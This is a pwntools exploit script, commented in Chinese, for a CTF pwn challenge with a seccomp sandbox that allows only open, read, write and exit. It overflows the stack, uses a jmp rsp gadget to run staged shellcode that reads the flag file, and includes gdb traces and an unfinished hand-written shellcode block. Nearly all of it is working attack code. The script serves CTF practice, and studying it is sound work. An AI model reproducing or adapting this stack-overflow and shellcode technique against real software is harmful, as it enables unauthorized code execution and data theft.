from pwn import *

'''
ORW，只给了read、write、open、exit
      seccomp_rule_add(v1, 2147418112, 0, 0);  // sys_read
      seccomp_rule_add(v1, 2147418112, 1, 0);  // sys_write
      seccomp_rule_add(v1, 2147418112, 2, 0);  // sys_open
      seccomp_rule_add(v1, 2147418112, 60, 0); // sys_exit
'''

r = remote('node5.buuoj.cn', 29882)
# r = process(r'./bad')
context.log_level = 'debug'
context.arch = 'amd64'

mmap = 0x123000
# ROPgadget --binary bad --only "jmp|ret"
jmp_rsp = 0x400A01

# 用 shellcraft 自动构造
shellcode_flag = shellcraft.open('./flag')
shellcode_flag += shellcraft.read(3, mmap + 0x100, 0x50)
shellcode_flag += shellcraft.write(1, mmap + 0x100, 0x50)
shellcode_flag = asm(shellcode_flag)

shellcode_jmp = asm(shellcraft.read(0, mmap, 0x100)) + asm(f'mov rax,{mmap};call rax')
shellcode_jmp = shellcode_jmp.ljust(0x28, b'\x00')
'''
*RBP  0x4141414141414141 ('AAAAAAAA')
*RSP  0x7fff3307ac78 ◂— 0x480ae4ff30ec8348
*RIP  0x400a4a ◂— ret 
───────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────
   0x7f5b7d488eaa <read+26>    ret    
    ↓
   0x400a3e                    mov    edi, 0x400b58
   0x400a43                    call   puts@plt                      <puts@plt>
 
   0x400a48                    nop    
   0x400a49                    leave  
 ► 0x400a4a                    ret    <0x480ae4ff30ec8348>
'''
# 当执行到leave指令时,rsp指向到是：*RSP  0x7fff3307ac78 ◂— 0x480ae4ff30ec8348，ret指令会把rip跳转到这个无效的地址
# 需要 jmp rsp 在执行ret指令时 把rip跳回rsp指向的地址上：
'''
 RBP  0x4141414141414141 ('AAAAAAAA')
*RSP  0x7fff6f40db80 ◂— 0x480ae4ff30ec8348
*RIP  0x400a01 ◂— jmp rsp
───────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────
   0x400a3e          mov    edi, 0x400b58
   0x400a43          call   puts@plt                      <puts@plt>
   0x400a48          nop    
   0x400a49          leave  
   0x400a4a          ret    
    ↓
 ► 0x400a01          jmp    rsp                           <0x7fff6f40db80>
    ↓
   0x7fff6f40db80    sub    rsp, 0x30
'''
shellcode_jmp += p64(jmp_rsp)
shellcode_jmp += asm(f'sub rsp,0x30;jmp rsp')  # 栈迁移到mmap

r.recvuntil(b'have fun!')
r.sendline(shellcode_jmp)
r.send(shellcode_flag)
r.interactive()


# =========> 手搓 shellcode (没写完) <===========
# sss = r'./flag'
# sss[::-1].encode('utf-8').hex()  ===>> 0x67616c662f2e
shellcode_flag = asm('''
        xor rax,rax
        mov rdi,0x67616c662f2e
        push rdi
        mov rdi,rsp
        xor rsi,rsi
        xor rdx,rdx
        mov rax,2
        syscall
        
        ....
''')
